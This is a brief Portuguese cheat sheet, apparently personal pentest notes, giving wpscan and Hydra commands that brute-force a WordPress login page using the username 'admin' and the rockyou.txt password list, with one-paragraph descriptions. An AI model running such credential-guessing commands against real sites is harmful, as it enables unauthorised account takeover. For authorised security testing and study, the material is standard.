# wpscan
### Comando:
wpscan --url http://example.com/wordpress/wp-login.php --passwords rockyou.txt --usernames admin
### Descrição:
WPScan é uma ferramenta de segurança focada em WordPress. Este comando realiza um ataque de força bruta no formulário de login do WordPress, tentando combinar o nome de usuário "admin" com senhas do arquivo rockyou.txt.

# Hydra
### Comando:
hydra -l admin -P rockyou.txt example.com http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:mensagem de erro"
### Descrição:
Hydra é uma ferramenta de brute force genérica que suporta vários protocolos. Este comando tenta fazer login no formulário de login do WordPress usando o nome de usuário "admin" e senhas do arquivo rockyou.txt. Ele usa o método HTTP POST para enviar os dados de login e verifica se a mensagem de erro retornada é "Invalid username or password".
